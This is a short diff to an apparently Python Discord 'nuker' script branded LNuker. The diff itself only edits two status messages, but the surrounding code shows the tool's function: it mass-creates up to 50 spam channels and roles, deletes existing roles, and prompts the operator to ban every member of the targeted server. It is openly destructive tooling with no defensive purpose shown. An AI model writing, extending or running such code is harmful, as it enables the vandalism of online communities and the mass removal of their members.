@@ -60,7 +60,7 @@ async def nuker(guild):
 
     create_channel_tasks = [guild.create_text_channel('nuked-by-lnuker') for _ in range(50 - len([ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]))]
     await asyncio.gather(*create_channel_tasks)
-    print(f'{Fore.GREEN}Created {len(create_channel_tasks)} new channels: nuked{Style.RESET_ALL}')
+    print(f'{Fore.GREEN}Created {len(create_channel_tasks)} new channels: nuked-by-lnuker{Style.RESET_ALL}')
 
     delete_role_tasks = []
     for role in guild.roles:
@@ -70,7 +70,7 @@ async def nuker(guild):
 
     create_role_tasks = [guild.create_role(name='Nuked by LNuker', color=discord.Color(random.randint(0, 0xFFFFFF))) for _ in range(50 - len(guild.roles))]
     await asyncio.gather(*create_role_tasks)
-    print(f'{Fore.GREEN}Created {len(create_role_tasks)} new roles: Nuked{Style.RESET_ALL}')
+    print(f'{Fore.GREEN}Created {len(create_role_tasks)} new roles: Nuked by LNuker{Style.RESET_ALL}')
 
     ban_choice = input(f"{Fore.RED}Ban all members? (y/n): {Style.RESET_ALL}")
     if ban_choice.lower() == 'y':
